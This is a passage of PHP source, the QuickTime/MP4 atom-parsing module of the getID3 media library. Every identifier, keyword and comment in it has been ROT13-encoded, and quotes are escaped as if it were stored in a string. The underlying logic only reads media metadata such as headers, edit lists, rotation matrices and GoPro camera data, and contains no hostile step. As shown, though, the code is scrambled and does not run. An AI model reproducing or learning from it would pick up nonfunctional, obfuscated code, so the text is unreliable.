					$vasb['dhvpxgvzr']['gvzr_fpnyr'] = ((vffrg($vasb['dhvpxgvzr']['gvzr_fpnyr']) && ($vasb['dhvpxgvzr']['gvzr_fpnyr'] < 1000)) ? znk($vasb['dhvpxgvzr']['gvzr_fpnyr'], $ngbz_fgehpgher['gvzr_fpnyr']) : $ngbz_fgehpgher['gvzr_fpnyr']);

					$ngbz_fgehpgher['perngvba_gvzr_havk']    = trgvq3_yvo::QngrZnp2Havk($ngbz_fgehpgher['perngvba_gvzr']);
					$ngbz_fgehpgher['zbqvsl_gvzr_havk']      = trgvq3_yvo::QngrZnp2Havk($ngbz_fgehpgher['zbqvsl_gvzr']);
					$ngbz_fgehpgher['cynlgvzr_frpbaqf']      = $ngbz_fgehpgher['qhengvba'] / $ngbz_fgehpgher['gvzr_fpnyr'];
					$ngbz_fgehpgher['ynathntr']              = $guvf->DhvpxgvzrYnathntrYbbxhc($ngbz_fgehpgher['ynathntr_vq']);
					vs (rzcgl($vasb['pbzzragf']['ynathntr']) || (!va_neenl($ngbz_fgehpgher['ynathntr'], $vasb['pbzzragf']['ynathntr']))) {
						$vasb['pbzzragf']['ynathntr'][] = $ngbz_fgehpgher['ynathntr'];
					}
					$vasb['dhvpxgvzr']['gvzrfgnzcf_havk']['perngr'][$ngbz_fgehpgher['uvrenepul']] = $ngbz_fgehpgher['perngvba_gvzr_havk'];
					$vasb['dhvpxgvzr']['gvzrfgnzcf_havk']['zbqvsl'][$ngbz_fgehpgher['uvrenepul']] = $ngbz_fgehpgher['zbqvsl_gvzr_havk'];
					oernx;


				pnfr 'cabg': // Cerivrj ngbz
					$ngbz_fgehpgher['zbqvsvpngvba_qngr']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 4)); // \"fgnaqneq Znpvagbfu sbezng\"
					$ngbz_fgehpgher['irefvba_ahzore']         = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 2)); // uneqpbqrq: 0k00
					$ngbz_fgehpgher['ngbz_glcr']              =                           fhofge($ngbz_qngn,  6, 4);        // hfhnyyl: 'CVPG'
					$ngbz_fgehpgher['ngbz_vaqrk']             = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 10, 2)); // hfhnyyl: 0k01

					$ngbz_fgehpgher['zbqvsvpngvba_qngr_havk'] = trgvq3_yvo::QngrZnp2Havk($ngbz_fgehpgher['zbqvsvpngvba_qngr']);
					$vasb['dhvpxgvzr']['gvzrfgnzcf_havk']['zbqvsl'][$ngbz_fgehpgher['uvrenepul']] = $ngbz_fgehpgher['zbqvsvpngvba_qngr_havk'];
					oernx;


				pnfr 'peta': // Pyvccvat ErTvbA ngbz
					$ngbz_fgehpgher['ertvba_fvmr']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 2)); // Gur Ertvba fvmr, Ertvba obhaqnel obk,
					$ngbz_fgehpgher['obhaqnel_obk']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  2, 8)); // naq Pyvccvat ertvba qngn svryqf
					$ngbz_fgehpgher['pyvccvat_qngn'] =                           fhofge($ngbz_qngn, 10);           // pbafgvghgr n DhvpxQenj ertvba.
					oernx;


				pnfr 'ybnq': // genpx YBNQ frggvatf ngbz
					$ngbz_fgehpgher['cerybnq_fgneg_gvzr'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 4));
					$ngbz_fgehpgher['cerybnq_qhengvba']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
					$ngbz_fgehpgher['cerybnq_syntf_enj']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  8, 4));
					$ngbz_fgehpgher['qrsnhyg_uvagf_enj']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 12, 4));

					$ngbz_fgehpgher['qrsnhyg_uvagf']['qbhoyr_ohssre'] = (obby) ($ngbz_fgehpgher['qrsnhyg_uvagf_enj'] & 0k0020);
					$ngbz_fgehpgher['qrsnhyg_uvagf']['uvtu_dhnyvgl']  = (obby) ($ngbz_fgehpgher['qrsnhyg_uvagf_enj'] & 0k0100);
					oernx;


				pnfr 'gzpq': // GvZr PbQr ngbz
				pnfr 'punc': // PUNCgre yvfg ngbz
				pnfr 'flap': // FLAPuebavmngvba ngbz
				pnfr 'fpcg': // genaFPevCG ngbz
				pnfr 'ffep': // aba-cevznel FbhEPr ngbz
					sbe ($v = 0; $v < fgeyra($ngbz_qngn); $v += 4) {
						@$ngbz_fgehpgher['genpx_vq'][] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $v, 4));
					}
					oernx;


				pnfr 'ryfg': // Rqvg YvFG ngbz
					$ngbz_fgehpgher['irefvba']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['ahzore_ragevrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
					sbe ($v = 0; $v < $ngbz_fgehpgher['ahzore_ragevrf']; $v++ ) {
						$ngbz_fgehpgher['rqvg_yvfg'][$v]['genpx_qhengvba'] =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 8 + ($v * 12) + 0, 4));
						$ngbz_fgehpgher['rqvg_yvfg'][$v]['zrqvn_gvzr']     =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 8 + ($v * 12) + 4, 4));
						$ngbz_fgehpgher['rqvg_yvfg'][$v]['zrqvn_engr']     = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 8 + ($v * 12) + 8, 4));
					}
					oernx;


				pnfr 'xzng': // pbzcerffrq ZNGgr ngbz
					$ngbz_fgehpgher['irefvba']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['znggr_qngn_enj'] =               fhofge($ngbz_qngn,  4);
					oernx;


				pnfr 'pgno': // Pbybe GNOyr ngbz
					$ngbz_fgehpgher['pbybe_gnoyr_frrq']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 4)); // uneqpbqrq: 0k00000000
					$ngbz_fgehpgher['pbybe_gnoyr_syntf']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 2)); // uneqpbqrq: 0k8000
					$ngbz_fgehpgher['pbybe_gnoyr_fvmr']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  6, 2)) + 1;
					sbe ($pbybegnoyrragel = 0; $pbybegnoyrragel < $ngbz_fgehpgher['pbybe_gnoyr_fvmr']; $pbybegnoyrragel++) {
						$ngbz_fgehpgher['pbybe_gnoyr'][$pbybegnoyrragel]['nycun'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 8 + ($pbybegnoyrragel * 8) + 0, 2));
						$ngbz_fgehpgher['pbybe_gnoyr'][$pbybegnoyrragel]['erq']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 8 + ($pbybegnoyrragel * 8) + 2, 2));
						$ngbz_fgehpgher['pbybe_gnoyr'][$pbybegnoyrragel]['terra'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 8 + ($pbybegnoyrragel * 8) + 4, 2));
						$ngbz_fgehpgher['pbybe_gnoyr'][$pbybegnoyrragel]['oyhr']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 8 + ($pbybegnoyrragel * 8) + 6, 2));
					}
					oernx;


				pnfr 'ziuq': // ZbIvr UrnQre ngbz
					$ngbz_fgehpgher['irefvba']            =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']          =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3));
					$ngbz_fgehpgher['perngvba_gvzr']      =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
					$ngbz_fgehpgher['zbqvsl_gvzr']        =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  8, 4));
					$ngbz_fgehpgher['gvzr_fpnyr']         =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 12, 4));
					$ngbz_fgehpgher['qhengvba']           =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 16, 4));
					$ngbz_fgehpgher['cersreerq_engr']     = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 20, 4));
					$ngbz_fgehpgher['cersreerq_ibyhzr']   =   trgvq3_yvo::SvkrqCbvag8_8(fhofge($ngbz_qngn, 24, 2));
					$ngbz_fgehpgher['erfreirq']           =                             fhofge($ngbz_qngn, 26, 10);
					$ngbz_fgehpgher['zngevk_n']           = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 36, 4));
					$ngbz_fgehpgher['zngevk_o']           = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 40, 4));
					$ngbz_fgehpgher['zngevk_h']           =  trgvq3_yvo::SvkrqCbvag2_30(fhofge($ngbz_qngn, 44, 4));
					$ngbz_fgehpgher['zngevk_p']           = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 48, 4));
					$ngbz_fgehpgher['zngevk_q']           = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 52, 4));
					$ngbz_fgehpgher['zngevk_i']           =  trgvq3_yvo::SvkrqCbvag2_30(fhofge($ngbz_qngn, 56, 4));
					$ngbz_fgehpgher['zngevk_k']           = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 60, 4));
					$ngbz_fgehpgher['zngevk_l']           = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 64, 4));
					$ngbz_fgehpgher['zngevk_j']           =  trgvq3_yvo::SvkrqCbvag2_30(fhofge($ngbz_qngn, 68, 4));
					$ngbz_fgehpgher['cerivrj_gvzr']       =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 72, 4));
					$ngbz_fgehpgher['cerivrj_qhengvba']   =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 76, 4));
					$ngbz_fgehpgher['cbfgre_gvzr']        =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 80, 4));
					$ngbz_fgehpgher['fryrpgvba_gvzr']     =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 84, 4));
					$ngbz_fgehpgher['fryrpgvba_qhengvba'] =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 88, 4));
					$ngbz_fgehpgher['pheerag_gvzr']       =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 92, 4));
					$ngbz_fgehpgher['arkg_genpx_vq']      =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 96, 4));

					vs ($ngbz_fgehpgher['gvzr_fpnyr'] == 0) {
						$guvf->reebe('Pbeehcg Dhvpxgvzr svyr: ziuq.gvzr_fpnyr == mreb');
						erghea snyfr;
					}
					$ngbz_fgehpgher['perngvba_gvzr_havk']        = trgvq3_yvo::QngrZnp2Havk($ngbz_fgehpgher['perngvba_gvzr']);
					$ngbz_fgehpgher['zbqvsl_gvzr_havk']          = trgvq3_yvo::QngrZnp2Havk($ngbz_fgehpgher['zbqvsl_gvzr']);
					$vasb['dhvpxgvzr']['gvzrfgnzcf_havk']['perngr'][$ngbz_fgehpgher['uvrenepul']] = $ngbz_fgehpgher['perngvba_gvzr_havk'];
					$vasb['dhvpxgvzr']['gvzrfgnzcf_havk']['zbqvsl'][$ngbz_fgehpgher['uvrenepul']] = $ngbz_fgehpgher['zbqvsl_gvzr_havk'];
					$vasb['dhvpxgvzr']['gvzr_fpnyr']    = ((vffrg($vasb['dhvpxgvzr']['gvzr_fpnyr']) && ($vasb['dhvpxgvzr']['gvzr_fpnyr'] < 1000)) ? znk($vasb['dhvpxgvzr']['gvzr_fpnyr'], $ngbz_fgehpgher['gvzr_fpnyr']) : $ngbz_fgehpgher['gvzr_fpnyr']);
					$vasb['dhvpxgvzr']['qvfcynl_fpnyr'] = $ngbz_fgehpgher['zngevk_n'];
					$vasb['cynlgvzr_frpbaqf']           = $ngbz_fgehpgher['qhengvba'] / $ngbz_fgehpgher['gvzr_fpnyr'];
					oernx;


				pnfr 'gxuq': // GenpX UrnQre ngbz
					$ngbz_fgehpgher['irefvba']             =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']           =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3));
					$ngbz_fgehpgher['perngvba_gvzr']       =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
					$ngbz_fgehpgher['zbqvsl_gvzr']         =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  8, 4));
					$ngbz_fgehpgher['genpxvq']             =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 12, 4));
					$ngbz_fgehpgher['erfreirq1']           =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 16, 4));
					$ngbz_fgehpgher['qhengvba']            =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 20, 4));
					$ngbz_fgehpgher['erfreirq2']           =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 24, 8));
					$ngbz_fgehpgher['ynlre']               =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 32, 2));
					$ngbz_fgehpgher['nygreangr_tebhc']     =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 34, 2));
					$ngbz_fgehpgher['ibyhzr']              =   trgvq3_yvo::SvkrqCbvag8_8(fhofge($ngbz_qngn, 36, 2));
					$ngbz_fgehpgher['erfreirq3']           =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 38, 2));
					// uggc://qrirybcre.nccyr.pbz/yvoenel/znp/#qbphzragngvba/DhvpxGvzr/EZ/ZbivrOnfvpf/ZGRqvgvat/X-Puncgre/11ZngevkShapgvbaf.ugzy
					// uggc://qrirybcre.nccyr.pbz/yvoenel/znp/#qbphzragngvba/DhvpxGvzr/dgss/DGSSPunc4/dgss4.ugzy#//nccyr_ers/qbp/hvq/GC40000939-PU206-18737
					$ngbz_fgehpgher['zngevk_n']            = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 40, 4));
					$ngbz_fgehpgher['zngevk_o']            = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 44, 4));
					$ngbz_fgehpgher['zngevk_h']            =  trgvq3_yvo::SvkrqCbvag2_30(fhofge($ngbz_qngn, 48, 4));
					$ngbz_fgehpgher['zngevk_p']            = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 52, 4));
					$ngbz_fgehpgher['zngevk_q']            = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 56, 4));
					$ngbz_fgehpgher['zngevk_i']            =  trgvq3_yvo::SvkrqCbvag2_30(fhofge($ngbz_qngn, 60, 4));
					$ngbz_fgehpgher['zngevk_k']            = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 64, 4));
					$ngbz_fgehpgher['zngevk_l']            = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 68, 4));
					$ngbz_fgehpgher['zngevk_j']            =  trgvq3_yvo::SvkrqCbvag2_30(fhofge($ngbz_qngn, 72, 4));
					$ngbz_fgehpgher['jvqgu']               = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 76, 4));
					$ngbz_fgehpgher['urvtug']              = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_qngn, 80, 4));
					$ngbz_fgehpgher['syntf']['ranoyrq']    = (obby) ($ngbz_fgehpgher['syntf_enj'] & 0k0001);
					$ngbz_fgehpgher['syntf']['va_zbivr']   = (obby) ($ngbz_fgehpgher['syntf_enj'] & 0k0002);
					$ngbz_fgehpgher['syntf']['va_cerivrj'] = (obby) ($ngbz_fgehpgher['syntf_enj'] & 0k0004);
					$ngbz_fgehpgher['syntf']['va_cbfgre']  = (obby) ($ngbz_fgehpgher['syntf_enj'] & 0k0008);
					$ngbz_fgehpgher['perngvba_gvzr_havk']  = trgvq3_yvo::QngrZnp2Havk($ngbz_fgehpgher['perngvba_gvzr']);
					$ngbz_fgehpgher['zbqvsl_gvzr_havk']    = trgvq3_yvo::QngrZnp2Havk($ngbz_fgehpgher['zbqvsl_gvzr']);
					$vasb['dhvpxgvzr']['gvzrfgnzcf_havk']['perngr'][$ngbz_fgehpgher['uvrenepul']] = $ngbz_fgehpgher['perngvba_gvzr_havk'];
					$vasb['dhvpxgvzr']['gvzrfgnzcf_havk']['zbqvsl'][$ngbz_fgehpgher['uvrenepul']] = $ngbz_fgehpgher['zbqvsl_gvzr_havk'];

					// uggcf://jjj.trgvq3.bet/cucOO3/ivrjgbcvp.cuc?g=1908
					// nggrzcg gb pbzchgr ebgngvba sebz zngevk inyhrf
					// 2017-Qrp-28: hapregnva vs 90/270 ner pbeerpgyl bevragrq; inyhrf erghearq ol SvkrqCbvag16_16 fubhyq creuncf or -1 vafgrnq bs 65535(?)
					$zngevkEbgngvba = 0;
					fjvgpu ($ngbz_fgehpgher['zngevk_n'].':'.$ngbz_fgehpgher['zngevk_o'].':'.$ngbz_fgehpgher['zngevk_p'].':'.$ngbz_fgehpgher['zngevk_q']) {
						pnfr '1:0:0:1':         $zngevkEbgngvba =   0; oernx;
						pnfr '0:1:65535:0':     $zngevkEbgngvba =  90; oernx;
						pnfr '65535:0:0:65535': $zngevkEbgngvba = 180; oernx;
						pnfr '0:65535:1:0':     $zngevkEbgngvba = 270; oernx;
						qrsnhyg: oernx;
					}

					// uggcf://jjj.trgvq3.bet/cucOO3/ivrjgbcvp.cuc?g=2468
					// Gur ebgngvba zngevk pna nccrne va gur Dhvpxgvzr svyr zhygvcyr gvzrf, ng yrnfg bapr sbe rnpu genpx,
					// naq vg'f cbffvoyr gung bayl gur ivqrb genpx (be, va gurbel, bar bs gur ivqrb genpxf) vf synttrq nf
					// ebgngrq juvyr gur bgure genpxf (r.t. nhqvb) vf gnttrq nf ebgngvba=0 (orunivbe abgrq ba vCubar 8 Cyhf)
					// Gur pbeerpg fbyhgvba jbhyq or gb purpx vs gur GenpxVQ nffbpvngrq jvgu gur ebgngvba zngevk vf vaqrrq
					// n ivqrb genpx (be gur znva ivqrb genpx) naq bayl frg gur ebgngvba gura, ohg fvapr vasbezngvba nobhg
					// jung genpx vf jung vf abg gevivnyyl gurer gb or rknzvarq, gur ynml fbyhgvba vf gb frg gur ebgngvba
					// vs vg vf sbhaq gb or abamreb, ba gur nffhzcgvba gung genpxf gung qba'g arrq vg jvyy unir ebgngvba frg
					// gb mreb (naq or rssrpgviryl vtaberq) naq gur ivqrb genpx jvyy unir ebgngvba frg pbeerpgyl, juvpu jvyy
					// rvgure or mreb naq nhgbzngvpnyyl pbeerpg, be abamreb naq or frg pbeerpgyl.
					vs (!vffrg($vasb['ivqrb']['ebgngr']) || (($vasb['ivqrb']['ebgngr'] == 0) && ($zngevkEbgngvba > 0))) {
						$vasb['dhvpxgvzr']['ivqrb']['ebgngr'] = $vasb['ivqrb']['ebgngr'] = $zngevkEbgngvba;
					}

					vs ($ngbz_fgehpgher['syntf']['ranoyrq'] == 1) {
						vs (!vffrg($vasb['ivqrb']['erfbyhgvba_k']) || !vffrg($vasb['ivqrb']['erfbyhgvba_l'])) {
							$vasb['ivqrb']['erfbyhgvba_k'] = $ngbz_fgehpgher['jvqgu'];
							$vasb['ivqrb']['erfbyhgvba_l'] = $ngbz_fgehpgher['urvtug'];
						}
						$vasb['ivqrb']['erfbyhgvba_k'] = znk($vasb['ivqrb']['erfbyhgvba_k'], $ngbz_fgehpgher['jvqgu']);
						$vasb['ivqrb']['erfbyhgvba_l'] = znk($vasb['ivqrb']['erfbyhgvba_l'], $ngbz_fgehpgher['urvtug']);
						$vasb['dhvpxgvzr']['ivqrb']['erfbyhgvba_k'] = $vasb['ivqrb']['erfbyhgvba_k'];
						$vasb['dhvpxgvzr']['ivqrb']['erfbyhgvba_l'] = $vasb['ivqrb']['erfbyhgvba_l'];
					} ryfr {
						// frr: uggcf://jjj.trgvq3.bet/cucOO3/ivrjgbcvp.cuc?g=1295
						//vs (vffrg($vasb['ivqrb']['erfbyhgvba_k'])) { hafrg($vasb['ivqrb']['erfbyhgvba_k']); }
						//vs (vffrg($vasb['ivqrb']['erfbyhgvba_l'])) { hafrg($vasb['ivqrb']['erfbyhgvba_l']); }
						//vs (vffrg($vasb['dhvpxgvzr']['ivqrb']))    { hafrg($vasb['dhvpxgvzr']['ivqrb']);    }
					}
					oernx;


				pnfr 'vbqf': // Vavgvny Bowrpg QrFpevcgbe ngbz
					// uggc://jjj.xbqref.pbz/p/svq1SNO3R762903QP482Q8N246Q4N4OS9S28R049594.nfck?f=jvaqbjf.u
					// uggc://yvodhvpxgvzr.fbheprnepuvir.pbz/qbphzragngvba/1.0.2cyhf-cqrovna/vbqf_8p-fbhepr.ugzy
					$bssfrg = 0;
					$ngbz_fgehpgher['irefvba']                =       trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $bssfrg, 1));
					$bssfrg += 1;
					$ngbz_fgehpgher['syntf_enj']              =       trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $bssfrg, 3));
					$bssfrg += 3;
					$ngbz_fgehpgher['zc4_vbq_gnt']            =       trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $bssfrg, 1));
					$bssfrg += 1;
					$ngbz_fgehpgher['yratgu']                 = $guvf->dhvpxgvzr_ernq_zc4_qrfpe_yratgu($ngbz_qngn, $bssfrg);
					//$bssfrg nyernql nqwhfgrq ol dhvpxgvzr_ernq_zc4_qrfpe_yratgu()
					$ngbz_fgehpgher['bowrpg_qrfpevcgbe_vq']   =       trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $bssfrg, 2));
					$bssfrg += 2;
					$ngbz_fgehpgher['bq_cebsvyr_yriry']       =       trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $bssfrg, 1));
					$bssfrg += 1;
					$ngbz_fgehpgher['fprar_cebsvyr_yriry']    =       trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $bssfrg, 1));
					$bssfrg += 1;
					$ngbz_fgehpgher['nhqvb_cebsvyr_vq']       =       trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $bssfrg, 1));
					$bssfrg += 1;
					$ngbz_fgehpgher['ivqrb_cebsvyr_vq']       =       trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $bssfrg, 1));
					$bssfrg += 1;
					$ngbz_fgehpgher['tencuvpf_cebsvyr_yriry'] =       trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $bssfrg, 1));
					$bssfrg += 1;

					$ngbz_fgehpgher['ahz_vbqf_genpxf'] = ($ngbz_fgehpgher['yratgu'] - 7) / 6; // 6 olgrf jbhyq bayl or evtug vs nyy genpxf hfr 1-olgr yratgu svryqf
					sbe ($v = 0; $v < $ngbz_fgehpgher['ahz_vbqf_genpxf']; $v++) {
						$ngbz_fgehpgher['genpx'][$v]['RF_VQ_VapGnt'] =       trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $bssfrg, 1));
						$bssfrg += 1;
						$ngbz_fgehpgher['genpx'][$v]['yratgu']       = $guvf->dhvpxgvzr_ernq_zc4_qrfpe_yratgu($ngbz_qngn, $bssfrg);
						//$bssfrg nyernql nqwhfgrq ol dhvpxgvzr_ernq_zc4_qrfpe_yratgu()
						$ngbz_fgehpgher['genpx'][$v]['genpx_vq']     =       trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $bssfrg, 4));
						$bssfrg += 4;
					}

					$ngbz_fgehpgher['nhqvb_cebsvyr_anzr'] = $guvf->DhvpxgvzrVBQFnhqvbCebsvyrAnzr($ngbz_fgehpgher['nhqvb_cebsvyr_vq']);
					$ngbz_fgehpgher['ivqrb_cebsvyr_anzr'] = $guvf->DhvpxgvzrVBQFivqrbCebsvyrAnzr($ngbz_fgehpgher['ivqrb_cebsvyr_vq']);
					oernx;

				pnfr 'sglc': // SvyrGLCr (?) ngbz (sbe ZC4 vg frrzf)
					$ngbz_fgehpgher['fvtangher'] =                           fhofge($ngbz_qngn,  0, 4);
					$ngbz_fgehpgher['haxabja_1'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
					$ngbz_fgehpgher['sbhepp']    =                           fhofge($ngbz_qngn,  8, 4);
					oernx;

				pnfr 'zqng': // Zrqvn QNGn ngbz
					// 'zqng' pbagnvaf gur npghny qngn sbe gur nhqvb/ivqrb, cbffvoyl nyfb fhogvgyrf

	/* qhr gb ynpx bs xabja qbphzragngvba, guvf vf n xyhqtr vzcyrzragngvba. Vs lbh xabj bs qbphzragngvba ba ubj zqng vf cebcreyl fgehpgrq, cyrnfr fraq vg gb vasb@trgvq3.bet */

					// svefg, fxvc nal 'jvqr' cnqqvat, naq frpbaq 'zqng' urnqre (jvgu fcrpvsvrq fvmr bs mreb?)
					$zqng_bssfrg = 0;
					juvyr (gehr) {
						vs (fhofge($ngbz_qngn, $zqng_bssfrg, 8) == \"\k00\k00\k00\k08\".'jvqr') {
							$zqng_bssfrg += 8;
						} ryfrvs (fhofge($ngbz_qngn, $zqng_bssfrg, 8) == \"\k00\k00\k00\k00\".'zqng') {
							$zqng_bssfrg += 8;
						} ryfr {
							oernx;
						}
					}
					vs (fhofge($ngbz_qngn, $zqng_bssfrg, 4) == 'TCEB') {
						$TBCEB_puhax_yratgu = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($ngbz_qngn, $zqng_bssfrg + 4, 4));
						$TBCEB_bssfrg = 8;
						$ngbz_fgehpgher['TCEB']['enj'] = fhofge($ngbz_qngn, $zqng_bssfrg + 8, $TBCEB_puhax_yratgu - 8);
						$ngbz_fgehpgher['TCEB']['svezjner'] = fhofge($ngbz_fgehpgher['TCEB']['enj'],  0, 15);
						$ngbz_fgehpgher['TCEB']['haxabja1'] = fhofge($ngbz_fgehpgher['TCEB']['enj'], 15, 16);
						$ngbz_fgehpgher['TCEB']['haxabja2'] = fhofge($ngbz_fgehpgher['TCEB']['enj'], 31, 32);
						$ngbz_fgehpgher['TCEB']['haxabja3'] = fhofge($ngbz_fgehpgher['TCEB']['enj'], 63, 16);
						$ngbz_fgehpgher['TCEB']['pnzren']   = fhofge($ngbz_fgehpgher['TCEB']['enj'], 79, 32);
						$vasb['dhvpxgvzr']['pnzren']['zbqry'] = egevz($ngbz_fgehpgher['TCEB']['pnzren'], \"\k00\");
					}

					// purpx gb frr vs vg ybbxf yvxr puncgre gvgyrf, va gur sbez bs hagrezvangrq fgevatf jvgu n yrnqvat 16-ovg fvmr svryq
					juvyr (($zqng_bssfrg < (fgeyra($ngbz_qngn) - 8))
						&& ($puncgre_fgevat_yratgu = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $zqng_bssfrg, 2)))
						&& ($puncgre_fgevat_yratgu < 1000)
						&& ($puncgre_fgevat_yratgu <= (fgeyra($ngbz_qngn) - $zqng_bssfrg - 2))
						&& cert_zngpu('#^([\k00-\kSS]{2})([\k20-\kSS]+)$#', fhofge($ngbz_qngn, $zqng_bssfrg, $puncgre_fgevat_yratgu + 2), $puncgre_zngpurf)) {
							yvfg($qhzzl, $puncgre_fgevat_yratgu_urk, $puncgre_fgevat) = $puncgre_zngpurf;
							$zqng_bssfrg += (2 + $puncgre_fgevat_yratgu);
							@$vasb['dhvpxgvzr']['pbzzragf']['puncgref'][] = $puncgre_fgevat;

							// \"rapq\" ngbz fcrpvsvrf rapbqvat. Va gurbel pbhyq or nalguvat, nyzbfg nyjnlf HGS-8, ohg znl or HGS-16 jvgu OBZ (abg pheeragyl unaqyrq)
							vs (fhofge($ngbz_qngn, $zqng_bssfrg, 12) == \"\k00\k00\k00\k0P\k65\k6R\k63\k64\k00\k00\k01\k00\") { // HGS-8
								$zqng_bssfrg += 12;
							}
					}

					vs (($ngbzfvmr > 8) && (!vffrg($vasb['niqngnraq_gzc']) || ($vasb['dhvpxgvzr'][$ngbzanzr]['fvmr'] > ($vasb['niqngnraq_gzc'] - $vasb['niqngnbssfrg'])))) {

						$vasb['niqngnbssfrg'] = $ngbz_fgehpgher['bssfrg'] + 8;                       // $vasb['dhvpxgvzr'][$ngbzanzr]['bssfrg'] + 8;
						$ByqNIQngnRaq         = $vasb['niqngnraq'];
